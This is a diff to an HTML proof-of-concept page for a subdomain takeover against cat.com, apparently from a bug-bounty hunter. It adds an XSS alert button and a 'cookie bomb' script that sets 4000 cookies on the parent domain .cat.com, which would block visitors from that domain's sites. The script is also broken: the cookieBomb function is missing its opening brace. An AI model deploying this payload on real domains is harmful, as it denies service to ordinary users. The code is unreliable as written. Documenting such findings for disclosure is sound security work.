@@ -1,3 +1,28 @@
 <!DOCTYPE html>
-  <html><head><title>PoC</title></head>
-  <body><h1>Subdomain takeover PoC by luq0x</h1></body></html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Subdomain Takeover PoCt</title>
+</head>
+<body>
+    <h1>Subdomain takeover PoC by m4rc10sz/luq0x</h1>
+    <hr>
+
+    <button onclick="executeXSS()">Execute XSS Alert</button>
+
+    <button onclick="cookieBomb()">Execute Cookie Bomb</button>
+
+    <script>
+        function executeXSS() {
+            alert("XSS Execution Context: " + document.domain);
+        }
+
+        function cookieBomb() 
+            for (var i = 0; i < 4000; i++) {
+                document.cookie = "bomb_takeover" + i + "=bomb_value; domain=.cat.com; path=/; secure; SameSite=None";
+            }
+            alert("Cookie bomb dropped successfully!");
+        }
+    </script>
+</body>
+</html>
